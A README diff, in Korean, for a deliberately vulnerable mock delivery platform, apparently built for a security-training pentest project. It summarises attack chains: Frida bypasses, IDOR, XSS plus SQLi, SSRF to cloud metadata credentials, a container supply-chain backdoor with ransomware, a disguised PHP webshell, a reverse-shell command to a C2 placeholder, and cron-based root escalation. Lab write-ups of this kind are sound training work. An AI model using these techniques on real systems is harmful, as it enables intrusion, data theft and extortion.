@@ -1,463 +1,191 @@
 # HackMin — 배달 주문 서비스 플랫폼
 
-배달 주문 서비스를 위한 풀스택 프로젝트입니다. 
-Django REST Framework 기반의 백엔드 API 서버, Django 템플릿 기반의 관리자/점주 웹, Android 네이티브 모바일 앱으로 구성
+배달의민족 스타일의 모의 배달 플랫폼으로, **SK쉴더스 루키즈 31기 최종 모의해킹 대상 시스템**입니다.
+직접 구축한 서비스를 대상으로 웹·모바일·인프라·AI 챗봇 전 영역에 걸쳐 취약점 진단 및 시나리오 기반 모의해킹을 수행했습니다.
+
+> **루키즈 31기 최종 프로젝트 1위**
+
+---
 
 ## 기술 스택
 
 | 구분 | 기술 |
 |---|---|
-| 백엔드 | Python 3.11, Django 5.0, Django REST Framework 3.15 |
-| 인증 | JWT (모바일, `Authorization: Bearer <token>`) + Session (점주/관리자 웹) |
-| DB | SQLite (개발) / MySQL (운영, RDS 연동 가능) |
+| 백엔드 | Python 3.11, Django 5.0, Django REST Framework |
+| 인증 | JWT (모바일) + Session (점주/관리자 웹) |
+| DB | SQLite (개발) / MySQL (운영, RDS 연동) |
 | 모바일 | Android (Java), Retrofit2 + OkHttp |
-| 관리자/점주 웹 | Django Templates (서버 사이드 렌더링) |
-| 배포 | Docker + docker-compose |
+| 관리자/점주 웹 | Django Templates |
+| 배포 | Docker + docker-compose, AWS (EC2, RDS, S3, ALB) |
+
+---
 
 ## 프로젝트 구조
 
 ```
 HackMin/
-├── apps/                          # Django 백엔드 앱
-│   ├── accounts/                  # 인증(/auth), 마이페이지(/me)
-│   │   ├── auth_urls.py           # 인증 관련 URL 라우팅
-│   │   ├── auth_views.py          # 로그인, 회원가입, 중복확인, 비밀번호 재설정
-│   │   ├── me_urls.py             # 마이페이지 URL 라우팅
-│   │   ├── me_views.py            # 내 정보 조회/수정, 배송지 관리
-│   │   ├── models.py              # User 모델 (AbstractUser 확장)
-│   │   └── serializers.py         # 인증/유저 시리얼라이저
-│   ├── adminpanel/                # 관리자 API (/admin)
-│   │   ├── urls.py                # 관리자 URL 라우팅
-│   │   └── views.py               # 사용자/점주/주문/결제 관리
-│   ├── carts/                     # 장바구니 (/cart)
-│   │   ├── models.py              # Cart, CartItem 모델
-│   │   ├── services.py            # 장바구니 비즈니스 로직
-│   │   └── views.py               # 장바구니 CRUD, 쿠폰 적용
-│   ├── chatbot/                   # 챗봇 (/chatbot)
-│   │   └── views.py               # 챗봇 메시지 처리
-│   ├── common/                    # 공통 유틸리티
-│   │   ├── exceptions.py          # 통합 에러 핸들러
-│   │   ├── management/commands/   # seed_demo 커맨드
-│   │   ├── pagination.py          # 표준 페이지네이션
-│   │   └── permissions.py         # 역할 기반 권한 (IsOwner, IsAdmin 등)
-│   ├── downloads/                 # 파일 다운로드 (/downloads)
-│   │   └── views.py               # 영수증, 매출보고서, 사업자등록증, 첨부파일
-│   ├── enrollment/                # 입점 신청
-│   │   ├── models.py              # EnrollmentApplication 모델
-│   │   └── views.py               # 입점 신청/승인 처리
-│   ├── orders/                    # 주문 (/orders)
-│   │   ├── models.py              # Order, OrderItem 모델
-│   │   └── views.py               # 주문 생성/조회/취소/재주문
-│   ├── owner/                     # 점주 API (/owner)
-│   │   ├── account.py             # 점주 계정 관리
-│   │   ├── orders.py              # 점주 주문 관리 (접수/거절/상태변경)
-│   │   ├── products.py            # 상품/카테고리/옵션 CRUD
-│   │   ├── reviews.py             # 리뷰 답변 관리
-│   │   └── sales.py               # 매출 조회/통계/CSV 내보내기
-│   ├── payments/                  # 결제 (/payments)
-│   │   ├── models.py              # Payment, Refund 모델
-│   │   └── views.py               # 결제 생성/취소/환불
-│   ├── promotions/                # 쿠폰/찜/멤버십 (/coupons, /favorites, /membership)
-│   │   ├── models.py              # Coupon, Favorite, Membership 모델
-│   │   └── views.py               # 쿠폰 발급, 찜, 멤버십 가입/해지
-│   ├── restaurants/               # 음식점 (/restaurants, /locations)
-│   │   ├── location_views.py      # 주소 검색, 주변 음식점
-│   │   ├── models.py              # Restaurant, Menu, MenuOption 모델
-│   │   └── views.py               # 음식점/메뉴 조회
-│   ├── reviews/                   # 리뷰 (/reviews)
-│   │   └── views.py               # 리뷰 작성/수정/삭제, 이미지 업로드
-│   ├── rider/                     # 배달기사 (/rider)
-│   │   └── views.py               # 배달 조회/상태 변경
-│   └── web/                       # 관리자/점주 웹 (Django Templates)
-│       ├── decorators.py          # 로그인/역할 데코레이터
-│       ├── templates/web/         # HTML 템플릿
-│       │   ├── base.html          # 공통 레이아웃
-│       │   ├── login.html         # 로그인 페이지
-│       │   ├── signup.html        # 회원가입 페이지
-│       │   ├── mypage.html        # 마이페이지
-│       │   ├── my_restaurant.html # 내 음식점 관리
-│       │   ├── admin/             # 관리자 페이지 (대시보드, 사용자, 주문, 결제 등)
-│       │   └── owner/             # 점주 페이지 (대시보드, 상품, 주문, 매출, 리뷰 등)
-│       ├── urls.py                # 웹 URL 라우팅
-│       └── views/                 # 뷰 모듈
-│           ├── auth.py            # 로그인/회원가입/로그아웃
-│           ├── account.py         # 마이페이지, 비밀번호 변경
-│           ├── owner.py           # 점주 대시보드, 상품/주문/매출/리뷰 관리
-│           ├── restaurant.py      # 음식점 등록/관리
-│           └── admin.py           # 관리자 대시보드, 사용자/점주/주문/결제 관리
-├── config/                        # Django 프로젝트 설정
-│   ├── settings.py                # DB, JWT, CORS, REST Framework 설정
-│   ├── urls.py                    # 루트 URL 라우팅 (api/v1/, web/, admin/)
-│   ├── wsgi.py                    # WSGI 엔트리포인트
-│   └── asgi.py                    # ASGI 엔트리포인트
-├── deliver_app/                   # Android 모바일 앱
-│   ├── app/src/main/
-│   │   ├── AndroidManifest.xml    # 앱 매니페스트 (Activity 등록)
-│   │   ├── java/com/hackmin/app/
-│   │   │   ├── data/
-│   │   │   │   ├── api/           # Retrofit API 인터페이스 (14개)
-│   │   │   │   │   ├── AuthApi.java       # 인증 (로그인, 회원가입, 중복확인)
-│   │   │   │   │   ├── CartApi.java       # 장바구니
-│   │   │   │   │   ├── OrderApi.java      # 주문
-│   │   │   │   │   ├── RestaurantApi.java # 음식점/메뉴
-│   │   │   │   │   ├── PaymentApi.java    # 결제
-│   │   │   │   │   ├── ReviewApi.java     # 리뷰
-│   │   │   │   │   ├── OwnerApi.java      # 점주
-│   │   │   │   │   ├── AdminApi.java      # 관리자
-│   │   │   │   │   ├── RiderApi.java      # 배달기사
-│   │   │   │   │   ├── PromotionApi.java  # 쿠폰/멤버십
-│   │   │   │   │   ├── DownloadApi.java   # 파일 다운로드
-│   │   │   │   │   ├── ChatbotApi.java    # 챗봇
-│   │   │   │   │   ├── LocationApi.java   # 위치/주소
-│   │   │   │   │   └── UserApi.java       # 사용자 정보
-│   │   │   │   └── model/         # DTO/Request/Response 모델
-│   │   │   │       ├── auth/      # LoginRequest, SignupRequest, LoginResponse 등
-│   │   │   │       ├── cart/      # CartDto, CartItemDto, AddCartItemRequest 등
-│   │   │   │       ├── order/     # OrderDto, OrderCreateRequest 등
-│   │   │   │       ├── owner/     # ProductDto, SalesSummaryDto 등
-│   │   │   │       ├── payment/   # PaymentDto, RefundRequest 등
-│   │   │   │       ├── promotion/ # CouponDto, MembershipDto 등
-│   │   │   │       ├── restaurant/# RestaurantDetailDto, MenuDto 등
-│   │   │   │       ├── review/    # ReviewDto, ReviewCreateRequest 등
-│   │   │   │       ├── rider/     # DeliveryDto, DeliveryStatusRequest 등
-│   │   │   │       ├── user/      # UserProfileDto, AddressDto 등
-│   │   │   │       └── common/    # ApiErrorResponse, PagedResponse 등
-│   │   │   ├── network/           # 네트워크 설정
-│   │   │   │   ├── ApiClient.java             # Retrofit/OkHttp 클라이언트 설정
-│   │   │   │   ├── AuthInterceptor.java       # 인증 토큰 헤더 인터셉터
-│   │   │   │   └── SessionManager.java        # 토큰/세션 저장 및 관리
-│   │   │   └── ui/                # 화면 (Activity)
-│   │   │       ├── auth/          # LoginActivity, SignupActivity, ForgotPasswordActivity
-│   │   │       ├── home/          # HomeActivity (메인 화면)
-│   │   │       ├── mypage/        # MyPageActivity
-│   │   │       ├── cart/          # CartActivity, CartItemAdapter
-│   │   │       └── order/         # OrderActivity, OrderHistoryActivity, OrderTrackingActivity
-│   │   └── res/
-│   │       ├── layout/            # XML 레이아웃 (12개)
-│   │       ├── drawable/          # 아이콘, 체크박스 셀렉터
-│   │       └── values/            # colors, strings, styles, themes
-│   ├── build.gradle.kts           # 앱 빌드 설정
-│   ├── gradle/                    # Gradle Wrapper
-│   └── settings.gradle.kts        # 프로젝트 설정
-├── docker/
-│   └── entrypoint.sh              # DB 대기, 마이그레이션, 시드 데이터
-├── docker-compose.yml             # api(8000), web(8001) 서비스 정의
-├── Dockerfile                     # Python 3.11 기반 이미지
-├── manage.py                      # Django 관리 명령어
-├── requirements.txt               # Python 패키지 의존성
-└── .gitignore                     # Python, Django, Android 빌드 산출물 무시
+├── apps/              # Django 백엔드 앱 (계정/주문/결제/배달/챗봇 등)
+├── deliver_app/       # Android 배달 앱 (Java)
+├── rider_app/         # Android 라이더 앱 (Java)
+├── admin_bff/         # 관리자 BFF
+├── web_bff/           # 점주 웹 BFF
+├── config/            # Django 설정
+├── docker/            # Docker 설정
+└── docs/              # 취약점 진단 및 모의해킹 보고서
+    ├── pentest/       # 시나리오 기반 모의해킹 결과보고서
+    ├── diagnosis/     # 영역별 취약점 진단 결과보고서
+    └── presentation/  # 최종 발표자료
 ```
+
+---
 
 ## 설치 및 실행
 
-### 방법 1: 로컬 실행
-
 ```bash
-# 가상환경 생성 및 활성화
 python -m venv .venv
-source .venv/Scripts/activate      # Windows Git Bash
-# .venv\Scripts\activate           # Windows CMD
-# source .venv/bin/activate        # macOS/Linux
-
-# 패키지 설치
+source .venv/bin/activate
 pip install -r requirements.txt
-
-# DB 마이그레이션 및 데모 데이터 생성
 python manage.py migrate
 python manage.py seed_demo
-
-# 서버 실행
 python manage.py runserver
 ```
 
-### 방법 2: Docker 실행
-
+Docker:
 ```bash
-# 빌드 및 실행
 docker-compose up --build
-
-# 백그라운드 실행
-docker-compose up -d --build
-
-# 로그 확인
-docker-compose logs -f api
-
-# 중지
-docker-compose down
 ```
-
-Docker 실행 시 두 개의 서비스가 기동됩니다:
 
 | 서비스 | 포트 | 역할 |
 |---|---|---|
-| `api` | `localhost:8000` | REST API 서버 (마이그레이션/시드 담당) |
-| `web` | `localhost:8001` | 관리자/점주 웹 (동일 DB 공유) |
+| `api` | `localhost:8000` | REST API 서버 |
+| `web` | `localhost:8001` | 관리자/점주 웹 |
 
-### Android 앱 실행
+데모 계정 (비밀번호: `pw1234`): `admin` / `alice` / `bob` / `owner` / `rider`
 
-1. Android Studio에서 `deliver_app/` 폴더를 프로젝트로 열기
-2. `network/ApiClient.java`에서 BASE_URL 확인
-   - 에뮬레이터: `http://10.0.2.2:8000/api/v1/` (호스트의 localhost로 연결)
-   - 실기기: `http://<PC_IP>:8000/api/v1/`
-3. 빌드 후 실행
+---
 
-## 데모 계정
+## 🔴 모의해킹 및 취약점 진단
 
-`python manage.py seed_demo` 실행 시 아래 계정이 생성됩니다. 모든 비밀번호는 `pw1234`입니다.
+> **본 프로젝트는 보안 교육 목적으로 구축된 취약 환경입니다. 허가받지 않은 실제 서비스에 대한 공격은 불법입니다.**
 
-| 계정 | 역할 | 용도 |
-|---|---|---|
-| `admin` | 관리자 | 관리자 패널 접근 |
-| `alice` | 고객 | 일반 고객 기능 테스트 |
-| `bob` | 고객 | 일반 고객 기능 테스트 |
-| `owner` | 점주 | 점주 대시보드, 상품/주문/매출 관리 |
-| `rider` | 배달기사 | 배달 조회/상태 변경 |
+### 진단 개요
 
-## API 공통 규약
-
-| 항목 | 규칙 |
+| 항목 | 내용 |
 |---|---|
-| Base URL | `/api/v1` |
-| 리스트 응답 | `{ "count", "next", "previous", "results" }` |
-| 에러 포맷 | `{ "code": "...", "message": "..." }` |
-| 헬스체크 | `GET /api/v1/health` → `{ "status": "ok" }` |
-| 인증 헤더 | `Authorization: Bearer <access_token>` |
-| 토큰 갱신 | `POST /api/v1/auth/refresh` (body: `{ "refresh": "<token>" }`) |
+| 주관 | SK쉴더스 루키즈 31기 |
+| 기간 | 2026.07.06 ~ 2026.09.09 |
+| 팀 구성 | 9인 (취약점 진단 + 모의해킹 병행) |
+| 진단 영역 | 웹, 모바일(Android), 클라우드 인프라(AWS), 생성형 AI 챗봇 |
+| 기준 | OWASP WSTG, OWASP MASTG, 전자금융기반시설 평가기준, OWASP LLM Top 10 2026, 2024 클라우드 보안 가이드 |
+| 사용 도구 | JADX, Ghidra, Frida, Burp Suite, Garak, LinPEAS, Ligolo-ng, AWS CLI, Kali Linux |
 
-## API 엔드포인트 목록
+---
 
-모든 경로는 `/api/v1` 기준입니다.
+### 시나리오 1 — 앱 보안기능 우회 → GPS 스푸핑 → 정산 계좌 탈취 ⭐ 담당
 
-### 1. 인증 `/auth`
+**공격 목표:** 라이더 앱·배달 앱의 보안 기능을 우회하고, IDOR·GPS 스푸핑·Stored XSS+SQLi를 연계하여 전체 라이더 정산 계좌를 공격자 계좌로 변조
 
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| POST | `/auth/signup` | 고객 회원가입 | 공개 |
-| POST | `/auth/login` | 로그인 | 공개 |
-| POST | `/auth/logout` | 로그아웃 | 인증 |
-| POST | `/auth/refresh` | 액세스 토큰 갱신 | 공개 |
-| GET | `/auth/check-duplicate` | 아이디/닉네임/이메일 중복 검사 | 공개 |
-| POST | `/auth/password/reset-request` | 비밀번호 재설정 요청 | 공개 |
-| POST | `/auth/password/reset` | 비밀번호 재설정 실행 | 공개 |
+#### STEP 1 — 정적 분석 (JADX + Ghidra)
 
-### 2. 마이페이지 `/me`
+라이더 앱(com.hackmin.connect)은 ProGuard 난독화가 적용되어 있으나, 호출 흐름 역추적으로 보안 로직을 식별했다.
 
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/me` | 내 정보 조회 | 고객 |
-| PUT | `/me` | 개인정보 수정 | 고객 |
-| DELETE | `/me` | 회원 탈퇴 | 고객 |
-| PUT | `/me/password` | 비밀번호 변경 | 고객 |
-| GET | `/me/addresses` | 배송지 목록 | 고객 |
-| POST | `/me/addresses` | 배송지 등록 | 고객 |
-| GET/PUT/DELETE | `/me/addresses/{id}` | 배송지 상세/수정/삭제 | 고객 |
-| GET | `/me/orders` | 주문 내역 조회 | 고객 |
-| GET | `/me/reviews` | 작성 리뷰 조회 | 고객 |
-| GET | `/me/coupons` | 보유 쿠폰 조회 | 고객 |
-| GET | `/me/membership` | 멤버십 상태 조회 | 고객 |
-
-### 3. 음식점/메뉴
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/restaurants` | 음식점 검색 (음식명/종류/가격/정렬) | 공개 |
-| GET | `/restaurants/{id}` | 음식점 상세 | 공개 |
-| GET | `/restaurants/{id}/menus` | 메뉴 목록 | 공개 |
-| GET | `/restaurants/{id}/reviews` | 음식점 리뷰 목록 | 공개 |
-| GET | `/menus/{id}` | 메뉴 상세 (옵션 포함) | 공개 |
-
-### 4. 위치 `/locations`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/locations/search` | 주소 검색 | 인증 |
-| GET | `/locations/nearby` | 주변 음식점 조회 | 인증 |
-
-### 5. 장바구니 `/cart`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/cart` | 장바구니 조회 | 고객 |
-| POST | `/cart/items` | 음식 추가 | 고객 |
-| PUT | `/cart/items/{id}` | 수량/옵션 변경 | 고객 |
-| DELETE | `/cart/items/{id}` | 음식 삭제 | 고객 |
-| POST | `/cart/coupon` | 쿠폰 적용 | 고객 |
-| GET | `/cart/summary` | 총액/배달비 계산 | 고객 |
-
-### 6. 주문 `/orders`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| POST | `/orders` | 주문 생성 | 고객 |
-| GET | `/orders/{id}` | 주문 상세 | 고객 |
-| GET | `/orders/{id}/status` | 주문 상태 확인 | 고객 |
-| POST | `/orders/{id}/cancel` | 주문 취소 | 고객 |
-| POST | `/orders/{id}/reorder` | 동일 메뉴 재주문 | 고객 |
-
-### 7. 결제 `/payments`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| POST | `/payments` | 결제 생성 | 고객 |
-| GET | `/payments/{id}` | 결제 상세 조회 | 고객 |
-| POST | `/payments/{id}/cancel` | 결제 취소 | 고객 |
-| POST | `/payments/{id}/refund` | 환불 요청 | 고객 |
-
-### 8. 리뷰 `/reviews`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| POST | `/reviews` | 리뷰 작성 | 고객 |
-| PUT | `/reviews/{id}` | 리뷰 수정 | 고객 |
-| DELETE | `/reviews/{id}` | 리뷰 삭제 | 고객 |
-| POST | `/reviews/{id}/images` | 리뷰 이미지 업로드 | 고객 |
-
-### 9. 쿠폰/찜/챗봇/멤버십
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/coupons` | 다운로드 가능 쿠폰 목록 | 고객 |
-| POST | `/coupons/{id}/download` | 쿠폰 다운로드 | 고객 |
-| POST | `/coupons/register` | 쿠폰 코드 등록 | 고객 |
-| GET | `/favorites` | 찜 목록 조회 | 고객 |
-| POST | `/favorites` | 음식점 찜 등록 | 고객 |
-| DELETE | `/favorites/{id}` | 찜 취소 | 고객 |
-| POST | `/chatbot/message` | 챗봇 메시지 | 고객 |
-| POST | `/membership/subscribe` | 멤버십 가입 | 고객 |
-| POST | `/membership/cancel` | 멤버십 해지 | 고객 |
-| GET | `/membership/benefits` | 혜택 조회 | 고객 |
-| GET | `/membership/payments` | 멤버십 결제 내역 | 고객 |
-
-### 10. 점주 — 계정/상품 `/owner`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| POST | `/owner/signup` | 점주 회원가입 | 공개 |
-| GET | `/owner/profile` | 점주 정보 조회 | 점주 |
-| PUT | `/owner/profile` | 점주 정보 수정 | 점주 |
-| POST | `/owner/business-license` | 사업자등록증 업로드 | 점주 |
-| GET | `/owner/products` | 상품 목록 | 점주 |
-| POST | `/owner/products` | 음식 등록 | 점주 |
-| GET/PUT/DELETE | `/owner/products/{id}` | 상품 상세/수정/삭제 | 점주 |
-| POST | `/owner/products/{id}/image` | 음식 이미지 업로드 | 점주 |
-| PUT | `/owner/products/{id}/status` | 판매/품절 상태 변경 | 점주 |
-| GET/POST | `/owner/categories` | 카테고리 목록/생성 | 점주 |
-| PUT/DELETE | `/owner/categories/{id}` | 카테고리 수정/삭제 | 점주 |
-| GET/POST | `/owner/products/{id}/options` | 메뉴 옵션 목록/생성 | 점주 |
-| PUT/DELETE | `/owner/options/{id}` | 메뉴 옵션 수정/삭제 | 점주 |
-
-### 11. 점주 — 주문/결제/매출/리뷰
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/owner/orders` | 주문 조회 | 점주 |
-| GET | `/owner/orders/{id}` | 주문 상세 | 점주 |
-| POST | `/owner/orders/{id}/accept` | 주문 접수 | 점주 |
-| POST | `/owner/orders/{id}/reject` | 주문 거절 | 점주 |
-| PUT | `/owner/orders/{id}/status` | 조리/배달 상태 변경 | 점주 |
-| POST | `/owner/orders/{id}/cancel` | 주문 취소 | 점주 |
-| GET | `/owner/payments` | 결제 내역 조회 | 점주 |
-| GET | `/owner/payments/{id}` | 결제 상세 | 점주 |
-| POST | `/owner/payments/{id}/cancel` | 결제 취소 | 점주 |
-| POST | `/owner/payments/{id}/refund` | 환불 처리 | 점주 |
-| GET | `/owner/sales` | 기간별 매출 조회 | 점주 |
-| GET | `/owner/sales/by-menu` | 메뉴별 매출 | 점주 |
-| GET | `/owner/sales/stats` | 매출 통계 | 점주 |
-| GET | `/owner/sales/export` | 매출 CSV 다운로드 | 점주 |
-| GET | `/owner/reviews` | 리뷰 목록 | 점주 |
-| POST | `/owner/reviews/{id}/reply` | 리뷰 답변 작성 | 점주 |
-
-### 12. 관리자 `/admin`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/admin/users` | 사용자 목록 조회 | 관리자 |
-| GET | `/admin/users/{id}` | 사용자 상세 조회 | 관리자 |
-| DELETE | `/admin/users/{id}` | 회원 탈퇴 처리 | 관리자 |
-| PUT | `/admin/users/{id}/status` | 회원 상태 변경 | 관리자 |
-| GET | `/admin/owners` | 점주 목록 조회 | 관리자 |
-| PUT | `/admin/owners/{id}/status` | 점주 계정 활성/비활성 | 관리자 |
-| GET | `/admin/orders` | 전체 주문 조회 | 관리자 |
-| GET | `/admin/payments` | 전체 결제 조회 | 관리자 |
-
-### 13. 배달기사 `/rider`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/rider/deliveries` | 배달 주문 조회 | 기사 |
-| GET | `/rider/deliveries/{id}` | 배달 상세 | 기사 |
-| PUT | `/rider/deliveries/{id}/status` | 배달 상태 변경 | 기사 |
-
-### 14. 파일 다운로드 `/downloads`
-
-| Method | Endpoint | 설명 | 권한 |
-|---|---|---|---|
-| GET | `/downloads/receipt/{order_id}` | 영수증 다운로드 | 고객/점주 |
-| GET | `/downloads/sales-report/{id}` | 매출 보고서 다운로드 | 점주 |
-| GET | `/downloads/business-license/{id}` | 사업자등록증 다운로드 | 점주/관리자 |
-| GET | `/downloads/order-history/{id}` | 주문 내역 다운로드 | 고객 |
-| GET | `/downloads/attachment/{id}` | 첨부파일 다운로드 | 인증 |
-
-## 관리자/점주 웹 페이지
-
-`localhost:8001/web/` (Docker) 또는 `localhost:8000/web/` (로컬)에서 접근합니다.
-
-| 경로 | 페이지 | 대상 |
+| 발견 항목 | 위치 | 내용 |
 |---|---|---|
-| `/web/login` | 로그인 | 공통 |
-| `/web/signup` | 회원가입 | 공통 |
-| `/web/me` | 마이페이지 | 공통 |
-| `/web/me/restaurant` | 내 음식점 관리 | 점주 |
-| `/web/owner/` | 점주 대시보드 | 점주 |
-| `/web/owner/orders` | 주문 관리 | 점주 |
-| `/web/owner/products` | 상품 관리 | 점주 |
-| `/web/owner/categories` | 카테고리 관리 | 점주 |
-| `/web/owner/sales` | 매출 현황 | 점주 |
-| `/web/owner/reviews` | 리뷰 관리 | 점주 |
-| `/web/admin/` | 관리자 대시보드 | 관리자 |
-| `/web/admin/users` | 사용자 관리 | 관리자 |
-| `/web/admin/owners` | 점주 관리 | 관리자 |
-| `/web/admin/orders` | 주문 조회 | 관리자 |
-| `/web/admin/payments` | 결제 조회 | 관리자 |
-| `/web/admin/withdrawals` | 출금 요청 관리 | 관리자 |
-| `/web/admin/restaurant-edits` | 음식점 정보 수정 요청 | 관리자 |
+| 루팅 탐지 | `LoginActivity.onCreate → v80.a → r70.c` | su 바이너리 9개 경로 + Magisk 경로 5개 체크 후 `Runtime.exit(0)` 호출 |
+| SSL Pinning | `res/xml/network_security_config.xml` | SHA-256 핀 4개 설정, Burp CA 설치해도 차단되는 구조 |
+| GPS Mock 탐지 | `defpackage.zv.a(Location)` | `isMock()` / `isFromMockProvider()` 결과로 서버 전송 차단 |
+| IDOR | `RiderApi.java → /riders/{id}/profile` | 토큰 소유권 검증 없이 타 라이더 계좌 정보 조회 가능, 응답의 `db_info` 필드에 테이블명·컬럼명까지 노출 |
+| 배달비 상한 API | `POST /api/v1/rider/fee-policy` | 관리자 권한이 아닌 일반 라이더 권한으로 플랫폼 전체 상한 변경 가능 (RBAC 미적용) |
 
-## 브랜치 전략
+#### STEP 2 — 동적 분석 및 보안 기능 우회 (Frida)
 
-| 브랜치 | 담당 영역 | 비고 |
-|---|---|---|
-| `main` | 통합 브랜치 | 직접 커밋 금지 (문서 제외), PR 머지만 허용 |
-| `feature/api` | Django 백엔드 (apps/, config/, Docker) | 모델/마이그레이션 변경은 여기서 시작 |
-| `feature/web` | 관리자/점주 웹 (apps/web/) | 모델 변경 시 api 먼저 머지 후 rebase |
-| `feature/app` | Android 앱 (deliver_app/) | API 인터페이스만 맞으면 독립 작업 가능 |
+루팅 탐지(`v80.a`, `r70.c`), SSL Pinning(`checkServerTrusted`, `checkTrustedRecursive`), GPS Mock 탐지(`isMock`, `isFromMockProvider`) 세 가지를 Frida 후킹으로 모두 우회 → Burp Suite 평문 트래픽 확보 및 GPS 스푸핑 앱 작동 가능
 
-머지 순서: 모델 변경 시 `feature/api → main → feature/web rebase → main`
+#### STEP 3 — IDOR로 라이더 정보 탈취
 
-## 환경 변수 (.env)
+Burp Suite Intruder로 `/riders/{id}/profile` 순차 열거 → 타 라이더 계좌번호·은행명·예금주 탈취. 응답의 `db_info` 필드로 DB 구조 확보 → 후속 SQLi 정밀도 향상에 활용
 
-| 변수 | 기본값 | 설명 |
-|---|---|---|
-| `DB_ENGINE` | `sqlite` | `sqlite` 또는 `mysql` |
-| `DB_SQLITE_PATH` | `db.sqlite3` | SQLite 파일 경로 |
-| `DB_NAME` | `hackmin` | MySQL 데이터베이스 이름 |
-| `DB_USER` | `hackmin` | MySQL 사용자 |
-| `DB_PASSWORD` | `hackmin` | MySQL 비밀번호 |
-| `DB_HOST` | (빈 문자열) | MySQL 호스트 (RDS 엔드포인트) |
-| `DB_PORT` | `3306` | MySQL 포트 |
-| `DB_SSL_CA` | (빈 문자열) | RDS SSL CA 번들 경로 |
-| `DJANGO_DEBUG` | `1` | 디버그 모드 (0: 비활성) |
-| `DJANGO_SECRET_KEY` | (개발용 기본값) | Django 시크릿 키 |
-| `SEED_DEMO` | `1` | 데모 데이터 자동 생성 (0: 비활성) |
+#### STEP 4 — GPS 스푸핑 + 배달비 부정 정산
 
-## 패키지 의존성
+1. 배달비 상한값 50,000원 → **999,999,999원으로 변조** (RBAC 미적용 API 악용)
+2. GPS 스푸핑으로 배달 거리 **374.7km 조작**
+3. 배달 완료 처리 → **배달비 약 38만원 부정 수령 시연**
 
-```
-Django==5.0.6
-djangorestframework==3.15.1
-djangorestframework-simplejwt==5.3.1
-django-cors-headers==4.4.0
-django-filter==24.2
-Pillow==10.3.0
-mysqlclient==2.2.4
-bleach==6.1.0
-```
+#### STEP 5~7 — Stored XSS + SQLi → 관리자 권한 → 계좌 일괄 변조
+
+배달 앱 1:1 문의의 XSS 필터를 Frida로 우회 → Stored XSS 페이로드 삽입. 관리자 웹에서 `innerHTML`로 이스케이프 없이 렌더링 → 관리자 브라우저 컨텍스트에서 스크립트 실행. 관리자 웹 검색 파라미터(`q=`)가 Django f-string으로 SQL에 직접 삽입 → Stacked Query SQLi로 **라이더 50명 정산 계좌 전체를 공격자 계좌로 일괄 변조**
+
+---
+
+### 시나리오 2 — 챗봇 SSRF → IAM 자격증명 탈취 → 컨테이너 공급망 오염 → 랜섬웨어 배포
+
+**공격 목표:** 챗봇 SSRF를 진입점으로 AWS 클라우드 권한을 탈취하고, ECR 컨테이너 이미지를 오염시켜 정상 배포 절차를 통해 서비스 전체에 랜섬웨어를 확산
+
+#### 공격 흐름
+
+| 단계 | 내용 |
+|---|---|
+| STEP 1 | 챗봇 링크 미리보기 기능으로 `http://169.254.169.254/latest/meta-data/iam/security-credentials/` 요청 → IMDSv1 적용으로 토큰 인증 없이 EC2 IAM 임시 자격증명(AccessKeyId·SecretAccessKey·Token) 탈취 |
+| STEP 2 | 탈취한 자격증명으로 AWS CLI 인증 → ECR 리포지토리 접근 → 운영 환경 컨테이너 이미지 Pull |
+| STEP 3 | 이미지 내부 소스코드 분석 → `os.environ`으로 주입되는 DB 접속 정보 확인 → **`.pth` 훅 메커니즘**으로 백도어(Python) + 랜섬웨어(Go) 페이로드 동시 삽입 → 오염 이미지를 기존 태그로 ECR Push하여 기존·베이스 이미지 전부 대체 |
+| STEP 4 | 개발자가 정상 업데이트 배포 수행 → 오염된 이미지가 운영 환경 EC2에 자동 배포 |
+| STEP 5 | 배포 약 5분 후 백도어 자동 실행 → RDS 전체 DB 덤프 후 테이블 DROP → **Tor 경유 C2 서버로 데이터 유출** |
+| STEP 6 | 배포 약 7분 후 랜섬웨어 발화 → 컨테이너 파일 암호화 + 랜섬노트 생성 |
+| STEP 7 | 개발자 롤백 시도 → ECR 내 모든 이미지가 이미 오염되어 **롤백 즉시 재감염, 복구 완전 무력화** |
+
+---
+
+### 시나리오 3 — 파일 업로드 취약점 → 웹쉘 → 권한 상승 → 내부 Splunk 침투
+
+**공격 목표:** 리뷰 이미지 업로드 취약점으로 서버 초기 침투 후 root 권한을 획득하고, 내부망의 Splunk 보안 모니터링 인프라까지 침투하여 로그 삭제 및 지속성 확보
+
+#### 공격 흐름
+
+| 단계 | 내용 |
+|---|---|
+| STEP 1 | 리뷰 이미지 업로드 기능에서 확장자 검증만 있고 서버 측 MIME 검증 없음 확인 → PHP 웹쉘을 `.png`로 위장하여 업로드 → 점주가 리뷰 조회 시 서버에서 PHP 실행 → C2 서버로 파일 실제 경로 자동 전송 → RCE(`X-Powered-By: PHP/8.5.7`) 확인 |
+| STEP 2 | 웹쉘로 `nohup bash -i >& /dev/tcp/C2_IP/4444 0>&1 &` 실행 → C2에서 `nginx(uid=997)` 권한 인터랙티브 리버스 셸 획득 |
+| STEP 3 | LinPEAS로 EC2 스캔 → `root:nginx 0775` 권한의 `/opt/scripts/health_check.sh` 발견 → Cron이 1분마다 root 권한으로 실행하는 스크립트임을 확인 → SUID Bash 복사 명령 삽입 → 1분 후 `rootbash -p`로 **EUID=0(root) 획득** |
